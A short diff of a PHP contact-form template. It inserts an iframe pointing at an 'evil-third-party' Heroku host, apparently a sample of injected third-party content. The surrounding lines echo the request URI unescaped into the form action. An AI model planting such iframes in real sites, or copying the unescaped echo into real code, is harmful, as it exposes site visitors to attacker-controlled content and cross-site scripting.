@@ -84,7 +84,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['form-name'])) {
             <div class="alert alert-danger text-center"><?php echo $config->get('messages.error'); ?></div>
         </div>
         <?php endif; ?>
-
+    <iframe src="https://evil-third-party.herokuapp.com/"></iframe>
     <div class="col-md-6 col-md-offset-3">
         <form action="<?php echo $_SERVER['REQUEST_URI']; ?>" enctype="application/x-www-form-urlencoded" id="contact-form" class="form-horizontal" method="GET">
             <div class="form-group">
